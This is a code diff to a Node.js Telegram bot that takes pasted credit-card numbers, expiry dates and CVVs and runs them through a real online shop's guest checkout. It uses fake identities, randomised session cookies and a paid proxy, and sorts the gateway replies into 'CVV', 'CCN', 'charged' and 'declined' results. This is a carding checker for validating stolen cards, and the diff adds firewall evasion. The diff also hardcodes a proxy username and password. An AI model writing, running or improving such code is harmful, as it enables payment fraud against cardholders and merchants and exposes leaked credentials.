@@ -10,14 +10,28 @@ const bot = new TelegramBot(token, { polling: true });
 const app = express();
 app.use(express.json());
 
-const firstNames = ['Shawn', 'James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard'];
-const lastNames = ['PHKHKKFG', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis'];
+// Proxy Configuration
+const proxyConfig = {
+    host: 'us-east.gw.rayobyte.com',
+    port: 8000,
+    auth: {
+        username: 'tumaob1us_gmail_com-isp',
+        password: 'Ntj9hnVhDb2B6vL4'
+    }
+};
+
+const firstNames = ['Shawn', 'James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas'];
+const lastNames = ['PHKHKKFG', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis', 'Garcia', 'Wilson'];
 const addresses = [
     { addr: '13822 NE Airport Way', city: 'Portland', state: 'OR', zip: '97251-9614' },
     { addr: '1234 Market St', city: 'San Francisco', state: 'CA', zip: '94103' },
     { addr: '456 Ocean Drive', city: 'Miami', state: 'FL', zip: '33139' },
-    { addr: '789 Broadway', city: 'New York', state: 'NY', zip: '10003' }
+    { addr: '789 Broadway', city: 'New York', state: 'NY', zip: '10003' },
+    { addr: '321 Michigan Ave', city: 'Chicago', state: 'IL', zip: '60611' }
 ];
+
+const randomEmails = ['jhefvrix', 'shawnph', 'testuser', 'fireflybuyer', 'user99x'];
+const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
 
 bot.onText(/\/avs (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
@@ -25,10 +39,10 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
     const startTime = Date.now();
 
     const parts = lista.split(/[:|]/);
-    const cc = parts[0];
-    let mes = parts[1];
-    let ano = parts[2];
-    const cvv = parts[3];
+    const cc = parts[0] || '';
+    let mes = parts[1] || '';
+    let ano = parts[2] || '';
+    const cvv1 = parts[3] || '';
 
     if (ano.length === 4) {
         ano = ano.slice(2);
@@ -40,54 +54,63 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
         const jar = new CookieJar();
         const client = wrapper(axios.create({
             jar,
-            timeout: 20000,
+            proxy: proxyConfig,
+            timeout: 30000,
             validateStatus: () => true
         }));
 
-        const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
-        
+        // IP Check
         let ip = 'Unknown';
         try {
             const ipRes = await client.get('https://api64.ipify.org/?format=json');
             ip = ipRes.data.ip || 'Unknown';
         } catch (e) {}
 
+        const dynamicSess = 'btrhdet07gjosk34' + Math.random().toString(36).substring(2, 7);
         const rfname = firstNames[Math.floor(Math.random() * firstNames.length)];
         const rlname = lastNames[Math.floor(Math.random() * lastNames.length)];
         const raddrInfo = addresses[Math.floor(Math.random() * addresses.length)];
-        const remail = `shawn${Math.floor(Math.random() * 900 + 100)}@gmail.com`;
+        const remail = randomEmails[Math.floor(Math.random() * randomEmails.length)] + Math.floor(Math.random() * 900 + 100) + '@gmail.com';
         const rphone = '971' + Math.floor(Math.random() * 900 + 100) + Math.floor(Math.random() * 9000 + 1000);
 
-        // 1. Add to Cart
-        const addRes = await client.post('https://fireflyfuel.com/cart/add-item.ajax/id/325', 'skuId=925&quantity=1', {
+        // 1. ADD TO CART
+        await client.post('https://fireflyfuel.com/cart/add-item.ajax/id/325', 'skuId=925&quantity=1', {
             headers: {
+                'authority': 'fireflyfuel.com',
+                'accept': 'application/json, text/javascript, */*; q=0.01',
                 'content-type': 'application/x-www-form-urlencoded',
+                'cookie': `PHPSESSID=${dynamicSess}`,
                 'origin': 'https://fireflyfuel.com',
                 'referer': 'https://fireflyfuel.com/shop/dropper',
-                'user-agent': ua,
-                'x-requested-with': 'XMLHttpRequest',
-                'accept': 'application/json, text/javascript, */*; q=0.01'
+                'user-agent': ua
             }
         });
 
-        if (typeof addRes.data === 'string' && addRes.data.includes('html')) {
-            bot.sendMessage(chatId, `❌ **Hinarang ng Firewall ang Add-to-Cart (Direct IP).**`);
-            return;
-        }
-
+        // 2. CHECKOUT GET
         await client.get('https://fireflyfuel.com/checkout', {
-            headers: { 'referer': 'https://fireflyfuel.com/shop/dropper', 'user-agent': ua }
+            headers: {
+                'authority': 'fireflyfuel.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'cookie': `PHPSESSID=${dynamicSess}`,
+                'referer': 'https://fireflyfuel.com/shop/dropper',
+                'user-agent': ua
+            }
         });
 
+        // 3. CHECKOUT GUEST POST
         await client.post('https://fireflyfuel.com/checkout', `type=guest&guestEmail=${encodeURIComponent(remail)}&offers=1`, {
             headers: {
+                'authority': 'fireflyfuel.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'content-type': 'application/x-www-form-urlencoded',
+                'cookie': `PHPSESSID=${dynamicSess}`,
                 'origin': 'https://fireflyfuel.com',
                 'referer': 'https://fireflyfuel.com/checkout',
                 'user-agent': ua
             }
         });
 
+        // 4. CHECKOUT INFO POST
         const infoData = new URLSearchParams({
             'shipping[country]': 'US',
             'shipping[US][firstName]': rfname,
@@ -101,19 +124,23 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
             'shipping[US][zipcode]': raddrInfo.zip,
             'billing[sameAsShipping]': '1',
             'billing[country]': 'US',
-            'billing[US][firstName]': rfname,
-            'billing[US][lastName]': rlname,
+            'billing[US][firstName]': '',
+            'billing[US][lastName]': '',
             'billing[US][company]': '',
-            'billing[US][phone]': rphone,
-            'billing[US][address1]': raddrInfo.addr,
+            'billing[US][phone]': '',
+            'billing[US][address1]': '',
             'billing[US][address2]': '',
-            'billing[US][city]': raddrInfo.city,
+            'billing[US][city]': '',
             'billing[US][state]': raddrInfo.state,
-            'billing[US][zipcode]': raddrInfo.zip
+            'billing[US][zipcode]': ''
         }).toString();
 
         await client.post('https://fireflyfuel.com/checkout/info', infoData, {
             headers: {
+                'authority': 'fireflyfuel.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'cookie': `PHPSESSID=${dynamicSess}`,
+                'accept-language': 'en-GB,en;q=0.8',
                 'content-type': 'application/x-www-form-urlencoded',
                 'origin': 'https://fireflyfuel.com',
                 'referer': 'https://fireflyfuel.com/checkout',
@@ -121,10 +148,18 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
             }
         });
 
+        // 5. CHECKOUT PAYMENT PAGE GET
         await client.get('https://fireflyfuel.com/checkout/payment', {
-            headers: { 'referer': 'https://fireflyfuel.com/checkout/info', 'user-agent': ua }
+            headers: {
+                'authority': 'fireflyfuel.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'cookie': `PHPSESSID=${dynamicSess}`,
+                'referer': 'https://fireflyfuel.com/checkout/info',
+                'user-agent': ua
+            }
         });
 
+        // 6. RUN PAYMENT AJAX
         const paymentData = new URLSearchParams({
             'x_amount': '3.90',
             'x_order_id': '',
@@ -148,36 +183,47 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
             'x_ship_to_country': 'US',
             'x_card_num': cc,
             'x_exp_date': `${mes}${ano}`,
-            'x_card_code': cvv
+            'x_card_code': cvv1
         }).toString();
 
         const payRes = await client.post('https://fireflyfuel.com/checkout/run-payment.ajax', paymentData, {
             headers: {
+                'authority': 'fireflyfuel.com',
+                'accept': '*/*',
+                'cookie': `PHPSESSID=${dynamicSess}`,
+                'accept-language': 'en-GB,en;q=0.8',
                 'content-type': 'application/x-www-form-urlencoded',
                 'origin': 'https://fireflyfuel.com',
                 'referer': 'https://fireflyfuel.com/checkout/payment',
                 'x-requested-with': 'XMLHttpRequest',
-                'user-agent': ua,
-                'accept': 'application/json, text/javascript, */*; q=0.01'
+                'user-agent': ua
             }
         });
 
-        const respData = payRes.data;
-        const endTime = ((Date.now() - startTime) / 1000).toFixed(2);
-        
-        let finalResponse = `Card: ${lista}\n`;
-        if (typeof respData === 'object' && respData !== null) {
-            if (respData.result === 'success') {
-                finalResponse += `STATUS: CHARGED ($3.90)\nOrder ID: ${respData.order_id || 'N/A'}\n`;
-            } else {
-                let msgResult = respData.messages ? respData.messages.replace(/<[^>]*>?/gm, '').trim() : 'Declined';
-                finalResponse += `STATUS: DECLINED\nReason: ${msgResult}\n`;
-            }
-        } else {
-            finalResponse += `STATUS: BLOCKED BY FIREWALL\nReason: Server returned HTML page instead of JSON.\n`;
-        }
-        finalResponse += `Time: ${endTime}s | IP: ${ip}`;
+        const ro2 = payRes.data;
+        const result = ro2 && ro2.result ? ro2.result : '';
+        let message = ro2 && ro2.messages ? ro2.messages.replace(/<[^>]*>?/gm, '').trim() : '';
+        const od = ro2 && ro2.order_id ? ro2.order_id : '';
 
+        const overallTime = ((Date.now() - startTime) / 1000).toFixed(2);
+
+        let finalResponse = `Card: ${lista}\n`;
+
+        if (message.includes('Gateway Error: The address provided does not match the billing address of the cardholder.')) {
+            finalResponse += `STATUS: [#CVV] Address Mismatch\n`;
+        } else if (message.includes('Gateway Error: Invalid CVV value') || message.includes('Gateway Error: Insufficient funds')) {
+            finalResponse += `STATUS: [#CCN] ${message}\n`;
+        } else if (result === 'success') {
+            finalResponse += `STATUS: [#CVV CHARGED $3.90]\nOrder Placed ID: ${od}\n`;
+        } else if (message === 'Call Issuer. Pick Up Card.') {
+            finalResponse += `STATUS: [DECLINED] Call Issuer. Pick Up Card.\n`;
+        } else if (message === 'Payment instrument type is not accepted by this merchant account.') {
+            finalResponse += `STATUS: [DECLINED] Payment instrument type not accepted.\n`;
+        } else {
+            finalResponse += `STATUS: [DECLINED]\nReason: ${message || 'Unknown error'}\n`;
+        }
+
+        finalResponse += `Time: ${overallTime}s | IP: ${ip}`;
         bot.sendMessage(chatId, finalResponse);
 
     } catch (error) {
@@ -186,7 +232,7 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
 });
 
 app.get('/', (req, res) => {
-    res.send('Unified AVS Telegram Bot is running!');
+    res.send('PHP-Converted AVS Telegram Bot is running!');
 });
 
 const PORT = process.env.PORT || 3000;
